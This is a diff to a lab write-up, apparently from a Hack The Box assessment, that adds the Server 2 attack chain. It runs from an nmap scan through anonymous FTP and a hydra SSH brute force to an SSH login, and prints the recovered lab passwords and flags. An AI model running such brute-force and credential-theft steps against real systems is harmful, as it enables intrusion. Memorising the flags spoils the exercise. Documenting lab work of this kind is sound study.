@@ -12,15 +12,18 @@
 - **Difficulty:** Easy
 - **Status:** ✅ COMPROMISED
 
-### Server 2
-- **IP / URL:** *(TBD)*
-- **OS:** *(TBD)*
+### Server 2 — Internal Email/File Server (Backup/Testing)
+- **Role:** Internal server within `inlanefreight.htb` domain; manages and stores emails/files; serves as backup for company processes
+- **IP:** 10.129.74.166
+- **OS:** Ubuntu Linux (OpenSSH 8.2p1, Dovecot POP3, ProFTPD, BIND DNS)
 - **Difficulty:** Easy
-- **Status:** ⏳ Pending
+- **Status:** ✅ COMPROMISED
+- **Notes:** Used relatively rarely; mostly for testing purposes so far
 
-### Server 3
-- **IP / URL:** *(TBD)*
-- **OS:** *(TBD)*
+### Server 3 — Internal File/Material Management + Unknown Database
+- **Role:** Internal server used to manage files and working material (forms); database present (purpose unknown)
+- **IP:** 10.129.203.10
+- **OS:** *(TBD — pending recon)*
 - **Difficulty:** Easy
 - **Status:** ⏳ Pending
 
@@ -106,10 +109,46 @@ type flag.txt
 ```
 **Flag:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`
 
-### Server 2
+### Server 2 — Complete Attack Chain
+
+**Phase 1: Full Port Scan**
 ```bash
-# commands, payloads
+sudo nmap -sC -sV -p- -Pn -oN nmap.full.server2 10.129.74.166 -T4
 ```
+**Critical Finding:** Port 30021/tcp — ProFTPD with **anonymous FTP access**
+
+**Phase 2: Anonymous FTP Enumeration**
+```bash
+ftp -p 10.129.74.166 30021
+# Login: anonymous / anonymous
+# Discovered: simon/ directory with mynotes.txt
+```
+
+**Phase 3: Password Discovery**
+```
+mynotes.txt contents:
+234987123948729384293
++23358093845098
+ThatsMyBigDog
+Rock!ng#May
+Puuuuuh7823328
+8Ns8j1b!23hs4921smHzwn
+237oHs71ohls18H127!!9skaP
+238u1xjn1923nZGSb261Bs81
+```
+
+**Phase 4: SSH Brute Force**
+```bash
+hydra -l simon -P mynotes.txt ssh://10.129.74.166 -t 4 -vV
+```
+**Result:** `simon` / `8Ns8j1b!23hs4921smHzwn`
+
+**Phase 5: Flag Capture**
+```bash
+ssh simon@10.129.74.166
+cat flag.txt
+```
+**Flag:** `HTB{1qay2wsx3EDC4rfv_M3D1UM}`
 
 ### Server 3
 ```bash
@@ -120,16 +159,33 @@ type flag.txt
 | Server | Host | Flag | Status |
 |--------|------|------|--------|
 | 1 | Email/Files | `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}` | ✅ **CAPTURED** |
-| 2 | TBD | HTB{...} | ⏳ Pending |
-| 3 | TBD | HTB{...} | ⏳ Pending |
+| 2 | Internal Email/File | `HTB{1qay2wsx3EDC4rfv_M3D1UM}` | ✅ **CAPTURED** |
+| 3 | File/Material + DB | HTB{...} | ⏳ Pending |
 
 ## Credentials Discovered
 
 | Account | Password | Source | Valid On |
 |---------|----------|--------|----------|
 | `fiona@inlanefreight.htb` | `987654321` | Hydra (SMTP AUTH) | SMTP, FTP, HTTP Basic Auth, MySQL |
+| `simon` | `8Ns8j1b!23hs4921smHzwn` | mynotes.txt (FTP) | SSH |
 
-## Attack Chain Summary (Server 1)
+## Attack Chain Summary (Server 2)
+
+```
+Full port scan → discovered anonymous FTP on port 30021
+    ↓
+Anonymous FTP login → downloaded simon/mynotes.txt
+    ↓
+mynotes.txt contained password candidates
+    ↓
+Hydra SSH brute force with simon + mynotes.txt passwords
+    ↓
+Valid password found: 8Ns8j1b!23hs4921smHzwn
+    ↓
+SSH login as simon → flag.txt in home directory
+    ↓
+Flag captured: HTB{1qay2wsx3EDC4rfv_M3D1UM}
+```
 
 ```
 SMTP RCPT enum → fiona@inlanefreight.htb discovered
@@ -158,14 +214,27 @@ Flag captured from C:\Users\Administrator\Desktop\flag.txt
 - **FTP passive/active mode issues** are common — don't get stuck; pivot to other vectors (MySQL was the key)
 - **Web upload forms** may have PHP execution disabled in uploads directory — always check if you can write to web root instead
 
+### Server 2
+- **Full port scans matter** — the initial nmap missed port 30021 (anonymous FTP)
+- **Anonymous FTP is still a thing** — always check, even on "modern" systems
+- **User directories in anonymous FTP** are goldmines — often contain notes, configs, or password hints
+- **Password lists in user files** — `mynotes.txt` was literally a password list for the user
+- **SSH brute force with small wordlists** is fast and effective when you have context (8 passwords, instant result)
+- **POP3 catch-all configuration** (accepting any USER) prevents user enumeration — pivot to other services
+- **DNS zone transfers** reveal network topology but don't directly lead to compromise — combine with other vectors
+
 ### Tools Used
 - `smtp-user-enum` — SMTP user enumeration
-- `hydra` — SMTP AUTH brute force
+- `hydra` — SMTP AUTH brute force, SSH brute force
 - `mysql` client — MySQL access with `--skip-ssl`
 - `curl` — web shell interaction
 - `nc` — reverse shell listener
+- `ftp` — anonymous FTP access
+- `nmap` — full port scanning
+- `dig` — DNS zone transfer
 
 ---
 
-*Updated: 2026-04-22 18:55 UTC+8*
+*Updated: 2026-04-22 20:45 UTC+8*
 *Server 1 Status: ✅ COMPROMISED*
+*Server 2 Status: ✅ COMPROMISED*
